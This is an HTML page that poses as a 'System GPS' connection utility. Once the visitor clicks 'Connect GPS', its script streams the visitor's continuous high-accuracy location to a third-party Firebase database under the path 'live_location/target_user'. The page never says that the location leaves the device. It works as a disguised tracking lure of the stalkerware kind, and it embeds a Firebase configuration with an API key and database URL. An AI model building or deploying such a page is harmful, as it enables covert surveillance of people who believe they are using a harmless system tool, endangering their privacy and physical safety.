<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>GPS Status</title>
    <style>
        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background-color: #f3f4f6; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; margin: 0; }
        .card { background: white; padding: 30px; border-radius: 15px; box-shadow: 0 4px 15px rgba(0,0,0,0.1); text-align: center; width: 80%; max-width: 350px; }
        h2 { color: #333; margin-bottom: 5px; }
        p { color: #666; font-size: 14px; margin-bottom: 20px; }
        .btn { padding: 15px 30px; border: none; border-radius: 25px; font-size: 16px; font-weight: bold; color: white; cursor: pointer; transition: 0.3s; width: 100%; box-sizing: border-box;}
        .btn-start { background-color: #2563eb; }
        .btn-start:hover { background-color: #1d4ed8; }
        .btn-stop { background-color: #ef4444; display: none; }
        .btn-stop:hover { background-color: #b91c1c; }
        #status { margin-top: 15px; font-weight: bold; color: #d97706; }
    </style>
</head>
<body>

    <div class="card">
        <h2>System GPS</h2>
        <p>Keep this app open to stay connected.</p>
        <button id="startBtn" class="btn btn-start">Connect GPS</button>
        <button id="stopBtn" class="btn btn-stop">Disconnect</button>
        <div id="status">Status: Disconnected</div>
    </div>

    <!-- Firebase SDK Setup -->
    <script type="module">
        import { initializeApp } from "https://www.gstatic.com/firebasejs/10.8.1/firebase-app.js";
        import { getDatabase, ref, set } from "https://www.gstatic.com/firebasejs/10.8.1/firebase-database.js";

        // Your Firebase Config
        const firebaseConfig = {
            apiKey: "AIzaSyAoQw5dhwS5JJZIWSPQTgKdMtB5ZEsoxLk",
            authDomain: "arng-805db.firebaseapp.com",
            projectId: "arng-805db",
            storageBucket: "arng-805db.firebasestorage.app",
            messagingSenderId: "363993462640",
            appId: "1:363993462640:web:22247bdf806f062a3b01b5",
            databaseURL: "https://arng-805db-default-rtdb.firebaseio.com/"
        };

        const app = initializeApp(firebaseConfig);
        const db = getDatabase(app);

        let watchId = null;
        const startBtn = document.getElementById('startBtn');
        const stopBtn = document.getElementById('stopBtn');
        const statusTxt = document.getElementById('status');

        startBtn.addEventListener('click', () => {
            if (navigator.geolocation) {
                statusTxt.innerText = "Status: Connecting to Satellite...";
                watchId = navigator.geolocation.watchPosition(
                    (position) => {
                        const lat = position.coords.latitude;
                        const lng = position.coords.longitude;
                        
                        // ফায়ারবেসে ডাটা পাঠানো হচ্ছে
                        set(ref(db, 'live_location/target_user'), {
                            latitude: lat,
                            longitude: lng,
                            timestamp: new Date().toLocaleString()
                        });

                        statusTxt.innerText = "Status: Connected (Live)";
                        statusTxt.style.color = "#16a34a";
                        startBtn.style.display = "none";
                        stopBtn.style.display = "block";
                    },
                    (error) => {
                        statusTxt.innerText = "Error: Please enable GPS/Location permission!";
                        statusTxt.style.color = "#dc2626";
                    },
                    { enableHighAccuracy: true, maximumAge: 0 }
                );
            } else {
                alert("Geolocation is not supported by this device.");
            }
        });

        stopBtn.addEventListener('click', () => {
            if (watchId) navigator.geolocation.clearWatch(watchId);
            statusTxt.innerText = "Status: Disconnected";
            statusTxt.style.color = "#d97706";
            startBtn.style.display = "block";
            stopBtn.style.display = "none";
        });
    </script>
</body>
</html>
